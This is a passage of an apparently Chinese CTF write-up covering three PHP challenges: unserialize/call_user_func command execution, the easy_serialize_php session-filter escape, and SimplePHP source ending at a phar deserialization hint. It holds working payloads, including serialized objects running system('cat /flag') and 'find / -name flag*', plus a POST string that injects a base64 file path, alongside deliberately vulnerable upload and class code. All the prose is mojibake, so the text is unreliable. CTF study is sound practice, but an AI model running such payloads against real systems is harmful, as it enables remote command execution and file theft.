<p>call_user_func()å‡½æ•°ä¼šæŠŠç¬¬ä¸€ä¸ªå‚æ•°å½“å¤šå›è°ƒå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°å½“ä½œå›è°ƒå‡½æ•°çš„å‚æ•°ï¼Œå¦‚æœ$funcæ˜¯unserializeï¼Œé‚£ä¹ˆå°±ä¼šå°†$pçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨__destruct()æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Test &#123;</span><br><span class="line">    var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func = &quot;date&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­çš„__destruct()æ–¹æ³•ä¼šå†æ¬¡è°ƒç”¨gettimeå‡½æ•°ï¼Œè¿™æ—¶å€™å¦‚æœ$funcæ˜¯systemï¼Œ$pæ˜¯cat &#x2F;flagä¸å°±å¯ä»¥å¾—åˆ°flagäº†å—</p>
<p>4.æ€è·¯ä¸ºå…ˆåˆ©ç”¨$funcæ¥ç¬¬ä¸€æ¬¡è°ƒç”¨gettimeå‡½æ•°ï¼Œåˆ©ç”¨call_user_func()å‡½æ•°æ¥ä½¿__destruct()æ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼Œç„¶åå†è¿›è¡Œç¬¬äºŒæ¬¡è°ƒç”¨gettimeå‡½æ•°ï¼Œç»™$pä¼ å‚ä¸ºåºåˆ—åŒ–çš„Testç±»ä¸­$funcä¸ºsystemï¼Œ$pä¸ºcat &#x2F;flagï¼Œè¿›è¡Œååºåˆ—åŒ–åå°±ä¼šç»™$funcå’Œ$pèµ‹å€¼ç„¶åå°±ä¼šæ‰§è¡Œcall_user_func()å‡½æ•°</p>
<p>5.æ„é€ payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    var $p = &#x27;cat /flag&#x27;;</span><br><span class="line">    var $func = &quot;system&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">è¾“å‡º</span><br><span class="line">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:9:&quot;cat /flag&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨burpä¸­è¿›è¡Œä¼ å‚func&#x3D;unserialize&amp;p&#x3D;O:4:â€Testâ€:2:{s:1:â€pâ€;s:9:â€cat &#x2F;flagâ€;s:4:â€funcâ€;s:6:â€systemâ€;}ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å›æ˜¾ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</p>
<p>6.çœ‹wpï¼Œå‘ç°æ€è·¯æ˜¯å¯¹çš„ï¼Œå°±æ˜¯æ„é€ payloadæ—¶çš„æ€è·¯æ˜¯é”™çš„ï¼Œflagå¹¶æ²¡æœ‰åœ¨&#x2F;flagæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å…ˆéœ€è¦è¿›è¡Œå¯»æ‰¾å¸¦æœ‰flagçš„æ–‡ä»¶</p>
<p>å†æ¬¡æ„é€ payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    var $p = &#x27;find / -name flag*&#x27;;//-name flag*æ˜¯å¯»æ‰¾ä»¥flagå¼€å¤´çš„æ–‡ä»¶</span><br><span class="line">    var $func = &quot;system&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">è¾“å‡º</span><br><span class="line">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨burpä¸­è¿›è¡Œä¼ å‚func&#x3D;unserialize&amp;p&#x3D;O:4:â€Testâ€:2:{s:1:â€pâ€;s:18:â€find &#x2F; -name flag*â€;s:4:â€funcâ€;s:6:â€systemâ€;}ï¼Œå‘ç°å¯ä»¥å›æ˜¾è®¸å¤šå¸¦æœ‰flagçš„æ–‡ä»¶ï¼Œå°±æ˜¯å›æ˜¾çš„æ—¶å€™æœ‰ç‚¹æ…¢ï¼Œéœ€è¦ç­‰</p>
<p>7.å…¶ä¸­æœ‰ç”¨çš„æ˜¯&#x2F;tmp&#x2F;flagoefiu4r93</p>
<p>åœ¨burpä¸­å†æ¬¡ä¼ å‚func&#x3D;unserialize&amp;p&#x3D;O:4:â€Testâ€:2:{s:1:â€pâ€;s:22:â€cat &#x2F;tmp&#x2F;flagoefiu4r93â€;s:4:â€funcâ€;s:6:â€systemâ€;}</p>
<p>æœ€åå¾—åˆ°äº†flag</p>
<h3 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h3><p>1.ç‚¹å‡»é¡µé¢ä¸Šçš„source_codeï¼Œæ˜¾ç¤ºå‡ºæºä»£ç </p>
<ol start="2">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function = @$_GET[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#x27;img_path&#x27;])&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">if($function == &#x27;highlight_file&#x27;)&#123;</span><br><span class="line">    highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">&#125;else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br><span class="line">&#125;else if($function == &#x27;show_image&#x27;)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.è¿™é‡Œæœ‰ä¸€å¥è¯maybe you can find something in here!ï¼Œæ„æ€æ˜¯é‡Œé¢å¯èƒ½æœ‰ä¸œè¥¿ï¼Œæˆ‘ä»¬å°†f&#x3D;phpinfoï¼Œæ‰“å¼€äº†phpçš„ç‰ˆæœ¬ï¼Œç„¶åæŸ¥æ‰¾å¸¦æœ‰flagçš„å­—ç¬¦ï¼Œå‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆï¼Œä½†è¿™å¥è¯è¿™é‡Œé¢è‚¯å®šæœ‰æœ‰ç”¨çš„ä¸œè¥¿ï¼Œå¯æ˜¯æˆ‘å¹¶æ²¡æœ‰æ‰¾åˆ°ä»€ä¹ˆï¼Œçœ‹wpå‘ç°é‡Œé¢çš„ d0g3_f1ag.phpæ–‡ä»¶é‡Œåº”è¯¥æœ‰flagï¼Œä¹‹åæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯æ‰“å¼€d0g3_f1ag.phpæ–‡ä»¶</p>
<ol start="4">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($function == &#x27;highlight_file&#x27;)&#123;</span><br><span class="line">    highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">&#125;else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br><span class="line">&#125;else if($function == &#x27;show_image&#x27;)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ˜¯å¦‚æœ$functionç­‰äºhighlight_fileå°±ä¼šæ‰“å¼€index.phpï¼Œå¦‚æœ$functionç­‰äºphpinfoå°±ä¼šæ‰§è¡Œeval(â€˜phpinfo();â€™)ï¼Œå¦‚æœ$functionç­‰äºshow_imageå°±ä¼šå…ˆå°†$serialize_infoåºåˆ—åŒ–ï¼Œç„¶åfile_get_contents()å‡½æ•°ä¼šæŠŠç»è¿‡base64è§£ç çš„$userinfo[â€˜imgâ€™]ä¸­çš„å†…å®¹ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›å‡ºæ¥</p>
<p>5.çœ‹filter()æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœecho $filterä¼šè¾“å‡ºphp|flag|php5|php4|fl1gï¼Œ<code>return preg_replace($filter,&#39;&#39;,$img);</code>æ˜¯å°†$imgä¸­å«æœ‰$filterçš„å†…å®¹æ›¿æ¢ä¸ºç©º</p>
<ol start="6">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br></pre></td></tr></table></figure>

<p>ä¼šå…ˆå°†$_sessionè¿›è¡Œåºåˆ—åŒ–ä»¥åï¼Œå†è¿›è¡Œfilteræ–¹æ³•</p>
<p>7.ä¸€å¼€å§‹çœ‹åˆ°<code>$_SESSION[&quot;user&quot;] = &#39;guest&#39;;  $_SESSION[&#39;function&#39;] = $function;  $_SESSION[&#39;img&#39;]</code>è¿˜ä¸çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œç„¶åçœ‹wpçŸ¥é“è¿™ä¸ªuser,function,imgæ˜¯$_SESSIONä¸­çš„æ•°ç»„çš„é”®å</p>
<p>8.è¿™é“é¢˜çš„æ€è·¯æ˜¯å¯ä»¥åˆ©ç”¨<code>preg_replace($filter,&#39;&#39;,$img);</code>è¿›è¡Œç¼©çŸ­å‹çš„ååºåˆ—åŒ–é€ƒé€¸ï¼Œç›®çš„æ˜¯è¦è®©imgè¿™ä¸ªé”®åçš„é”®å€¼ä¸ºæˆ‘ä»¬éœ€è¦æ‰“å¼€çš„æ–‡ä»¶åçš„base64ç¼–ç ï¼Œå…ˆåœ¨urlå¤„å°†f&#x3D;show_imageï¼Œç„¶ååœ¨hackbarçš„postå¤„è¿›è¡Œä¼ å‚ï¼Œä¼ å…¥<code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</code></p>
<p>9.è¿™æ ·ç»è¿‡ç³»åˆ—åŒ–å’Œfilteræ–¹æ³•åå°±å˜æˆäº†<code>&quot;a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</code>ï¼Œç›¸å½“äºuserçš„é”®å€¼æ˜¯<code>&quot;;s:8:&quot;function&quot;;s:59:&quot;a</code>ï¼Œimgçš„é”®å€¼æ˜¯<code>ZDBnM19mMWFnLnBocA==</code>ï¼Œddçš„é”®å€¼æ˜¯<code>a</code>ï¼Œè€Œåé¢çš„<code>;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</code>å°±è¢«åºŸé™¤äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br><span class="line">è¿™é‡Œçš„s:2:&quot;dd&quot;;s:1:&quot;a&quot;;ä¸­çš„ddå’Œaå¯ä»¥éšä¾¿æ”¹å€¼ï¼Œå› ä¸º_sessionè¿™ä¸ªæ•°ç»„ä¸­ä¸€å…±æœ‰ä¸‰ä¸ªå…ƒç´ ï¼Œåªè¦å‡‘å¤Ÿä¸‰ä¸ªå…ƒç´ å°±å¯ä»¥äº†</span><br></pre></td></tr></table></figure>

<p>10.æŸ¥çœ‹æºä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &#x27;flag in /d0g3_fllllllag&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å°†payloadä¸­çš„ZDBnM19mMWFnLnBocA&#x3D;&#x3D;æ¢æˆL2QwZzNfZmxsbGxsbGFnï¼Œè¿™é‡Œçš„L2QwZzNfZmxsbGxsbGFnæ˜¯&#x2F;d0g3_fllllllagçš„base64ç¼–ç </p>
<p>æœ€åå¾—åˆ°flag</p>
<h3 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h3><p>1.æ‰“å¼€ç½‘é¡µæ˜¯æ˜¾ç¤ºé¦–é¡µï¼ŒæŸ¥çœ‹æ–‡ä»¶ï¼Œä¸Šä¼ æ–‡ä»¶ï¼›é¦–é¡µæ‰“å¼€çš„æ–‡ä»¶æ˜¯index.phpï¼Œåœ¨æŸ¥çœ‹æ–‡ä»¶é‚£æ‰“å¼€index.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);  </span><br><span class="line">include &#x27;base.php&#x27;;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>åœ¨æ‰“å¼€base.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base.php</span><br><span class="line">&lt;?php </span><br><span class="line">    session_start(); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt; </span><br><span class="line">    &lt;title&gt;web3&lt;/title&gt; </span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">    &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;container-fluid&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;navbar-header&quot;&gt; </span><br><span class="line">            &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;é¦–é¡µ&lt;/a&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; </span><br><span class="line">                &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;æŸ¥çœ‹æ–‡ä»¶&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;ä¸Šä¼ æ–‡ä»¶&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#x27;REMOTE_ADDR&#x27;];?&gt;&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">    &lt;/nav&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line">&lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€file.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file.php</span><br><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);  </span><br><span class="line">include &#x27;function.php&#x27;; </span><br><span class="line">include &#x27;class.php&#x27;; </span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); </span><br><span class="line">$file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; </span><br><span class="line">if(empty($file)) &#123; </span><br><span class="line">    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">$show = new Show(); </span><br><span class="line">if(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; else if (!empty($file))&#123; </span><br><span class="line">    die(&#x27;file doesn\&#x27;t exists.&#x27;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€upload_file.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload_file.php</span><br><span class="line">&lt;?php </span><br><span class="line">include &#x27;function.php&#x27;; </span><br><span class="line">upload_file(); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charest=&quot;utf-8&quot;&gt; </span><br><span class="line">&lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;/title&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;div align = &quot;center&quot;&gt; </span><br><span class="line">        &lt;h1&gt;å‰ç«¯å†™å¾—å¾ˆlow,è¯·å„ä½å¸ˆå‚…è§è°…!&lt;/h1&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;style&gt; </span><br><span class="line">    p&#123; margin:0 auto&#125; </span><br><span class="line">&lt;/style&gt; </span><br><span class="line">&lt;div&gt; </span><br><span class="line">&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; </span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;æ–‡ä»¶å:&lt;/label&gt; </span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; </span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line"></span><br><span class="line">&lt;/script&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€function.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">function.php</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123; </span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€class.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class.php</span><br><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2.å…¶ä¸­æœ‰ç”¨çš„æ˜¯class.phpï¼Œé‡Œé¢æ²¡æœ‰ååºåˆ—åŒ–å‡½æ•°ï¼Œä½†å¯ä»¥ä½¿ç”¨pharååºåˆ—åŒ–</p>
